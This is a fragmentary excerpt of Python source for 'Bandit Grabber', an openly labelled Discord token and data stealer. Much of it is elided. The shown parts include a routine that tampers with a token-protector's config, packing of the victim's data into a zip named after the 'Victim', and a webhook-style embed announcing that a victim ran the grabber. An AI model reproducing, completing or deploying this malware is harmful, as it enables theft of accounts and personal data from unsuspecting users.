...
class BanditGrabber(Functions):
    ...
    async def bypassTokenProtector(self):
        ...
        if os.path.exists(config):
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Bandit Grabber | https://github.com/Futmarcc")
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("Grabber by Marcc#6666 | Bandit\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x+"\n\nGrabber By github.com/Futmarcc ・https://github.com/Futmarcc")
        ...
        _zipfile = os.path.join(self.appdata, f'Bandit-[{Victim}].zip')
        ...
        embed = {
            'avatar_url': 'https://i.pinimg.com/736x/e0/e7/b3/e0e7b3947c61b5eeccf8c06b2b92cf77.jpg',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* opened Bandit Grabber',
                        'url': 'https://github.com/Futmarcc',
                        'icon_url': 'https://m.media-amazon.com/images/I/81G0WI0Oo5L._SS500_.jpg'
                    },
                    'color': 176185,
                    ...
                    'footer': {
                        'text': 'Grabber By github.com/Futmarcc  |  Bandit  | Discord injection by Rdimo#6969'
                    }
                }
            ]
        }
...
if __name__ == "__main__" and os.name == "nt":
    try:
        ...
        os._exit(0)
    asyncio.run(BanditGrabber().init())